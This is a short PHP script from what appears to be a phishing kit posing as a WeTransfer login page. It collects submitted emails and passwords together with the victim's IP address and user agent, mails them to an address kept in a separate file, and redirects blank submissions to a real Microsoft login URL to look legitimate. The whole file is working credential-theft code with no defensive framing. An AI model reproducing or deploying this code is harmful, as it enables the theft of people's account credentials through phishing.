<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------wetransf3r Info-----------------------\n";
$message .= "Username            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "wetransf3r | $ip";
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step.php?cmd=login_submit&id=$praga$praga&session=$praga$praga&email=".$_POST['email']);
}else{
header ("Location: https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d1d7fIHbS39W1dylPNH-JCBAPmQXKz8TsNsIosZ8cpKLD-bU5TRvDUMq3zvVBqUK3ZV10v0Nc9C4TOd93cGJo6b5hNZIFKmsx77MCYoeV3wyEeVTFV4uyM2F0Keww76TX&nonce=636516900962501689.NjI2ZDFmZjQtOWFmYy00ZTc2LThlYTAtZDE5NTMwMWFlZjVkNmJjMmFlZDgtMDQ3OS00ZWQzLWJhZDctNjZlZGE3OGM5MDkw&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-ZA&mkt=en-ZA ");
}

?>